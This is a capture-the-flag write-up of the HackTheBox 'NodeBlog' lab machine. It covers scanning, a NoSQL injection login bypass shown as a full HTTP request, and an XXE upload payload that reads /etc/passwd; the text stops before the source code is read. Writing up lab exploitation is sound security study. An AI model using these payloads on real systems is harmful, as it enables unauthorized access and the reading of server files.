### NodeBlog HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.139

Nmap Scan:

```
─$ nmap -sCV 10.10.11.139 -p22,5000 -oN nmapscan          
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-25 00:34 WAT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.29% done; ETC: 00:35 (0:00:00 remaining)
Nmap scan report for 10.10.11.139
Host is up (0.33s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
5000/tcp open  http    Node.js (Express middleware)
|_http-title: Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.17 seconds
                                                                
```

From the scan we see that only 2 ports are open which are just ssh and http

#### Web Server Enumeration

Heading over to the web server shows this page
![image](https://user-images.githubusercontent.com/113513376/221321193-b601500e-83b7-4402-8d9d-fd6da0c0de0e.png)

Checking the web server header shows its running on express which is a nodejs web server

```
└─$ curl -v -I http://10.10.11.139:5000/
*   Trying 10.10.11.139:5000...
* Connected to 10.10.11.139 (10.10.11.139) port 5000 (#0)
> HEAD / HTTP/1.1
> Host: 10.10.11.139:5000
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
HTTP/1.1 200 OK
< X-Powered-By: Express
X-Powered-By: Express
< Content-Type: text/html; charset=utf-8
Content-Type: text/html; charset=utf-8
< Content-Length: 1891
Content-Length: 1891
< ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
ETag: W/"763-yBLqx1Bg/Trp0SZ2cyMSGFoH5nU"
< Date: Sat, 25 Feb 2023 03:47:16 GMT
Date: Sat, 25 Feb 2023 03:47:16 GMT
< Connection: keep-alive
Connection: keep-alive
< Keep-Alive: timeout=5
Keep-Alive: timeout=5

< 
* Connection #0 to host 10.10.11.139 left intact
```

There's a login page
![image](https://user-images.githubusercontent.com/113513376/221321469-08a6fa01-f556-4dfd-8c9f-95d1431affc0.png)

Trying weak/default credential doesn't work

Note that how you would have a LAMP stack running Apache and MySQL, NPM aka node package manager could be in use on an Express Server and they usually configure those to run with NOSQL dbs like Redis, Couch, influx or Mongo db

I'll attempt NOSQL Injection 

While messing with the request i was able to throw an error that leaked the path of the web server
![image](https://user-images.githubusercontent.com/113513376/221323416-13489052-c5b0-4a70-b302-121f51433f15.png)

```
<pre>SyntaxError: Unexpected token l in JSON at position 21<br>
  &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> 
  &nbsp; &nbsp;at parse (/opt/blog/node_modules/body-parser/lib/types/json.js:89:19)<br>
  &nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read.js:121:18<br> 
  &nbsp; &nbsp;at invokeCallback (/opt/blog/node_modules/raw-body/index.js:224:16)<br> 
  &nbsp; &nbsp;at done (/opt/blog/node_modules/raw-body/index.js:213:7)<br> 
  &nbsp; &nbsp;at IncomingMessage.onEnd (/opt/blog/node_modules/raw-body/index.js:273:7)<br>
  &nbsp; &nbsp;at IncomingMessage.emit (events.js:412:35)<br>
  &nbsp; &nbsp;at endReadableNT (internal/streams/readable.js:1334:12)<br> 
  &nbsp; &nbsp;at processTicksAndRejections (internal/process/task_queues.js:82:21)
</pre>
```

Using this payload works:
![image](https://user-images.githubusercontent.com/113513376/221324337-58269775-0870-47f9-aa95-dd4c49658453.png)

```
Payload: {"user": {"$ne": null}, "password": {"$ne": null} }
```

Here's the login post request

```
POST /login HTTP/1.1
Host: 10.10.11.139:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 17
Origin: http://10.10.11.139:5000
Connection: close
Referer: http://10.10.11.139:5000/login
Upgrade-Insecure-Requests: 1

{"user": {"$ne": null}, "password": {"$ne": null} }
```

We are now logged in and we see two functions which are new article and a upload function
![image](https://user-images.githubusercontent.com/113513376/221324613-2e31b728-9cf2-40ad-9ed2-3b8961e7c3ed.png)

Checking the new article shows this 
![image](https://user-images.githubusercontent.com/113513376/221324732-6136868e-e2a6-4c0b-b82a-4d2d42d4d372.png)

I'll try creating an article with intercepting the request in burp

But nothing interesting here 
![image](https://user-images.githubusercontent.com/113513376/221324843-82321a8f-6b4d-4642-8cd9-3d631eee92ae.png)

Time to check the upload function

I uploaded a random file and i got this
![image](https://user-images.githubusercontent.com/113513376/221324899-e81e985a-1f25-4c37-9656-369123354b5f.png)

Hmm it seems it requires an xml file with the article format  

```
 Title Description Markdown
```

I created an xml file with those values needed [Resource](https://www.w3schools.com/xml/)

```
<?xml version="1.0" encoding="UTF-8"?>
<article>
  <title>Learn Pwn</title>
  <description>Lol</description>
  <markdown>`hehe`</markdown>
</article>
```

After i uploaded it i got the content of tags 
![image](https://user-images.githubusercontent.com/113513376/221326190-2ad801f7-c715-4408-8647-8042e65ed198.png)

With this, we can leverage this to read local file via XXE

Since it will show the content of what's in the tag 

Here's the resouce i got the payload [HackTricks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT title ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<article>
  <title>&file;</title>
  <description>Lol</description>
  <markdown>`hehe`</markdown>
</article>
```

Uploading that leaks the `/etc/passwd` file
![image](https://user-images.githubusercontent.com/113513376/221326390-99f28637-b05f-42f7-ae0d-cded719c698a.png)
![image](https://user-images.githubusercontent.com/113513376/221326415-0f26039c-df4c-4dfb-8ee7-f205e931241a.png)

Since we previously leaked the path of the web server and we know that its a nodejs web server, lets read its source code

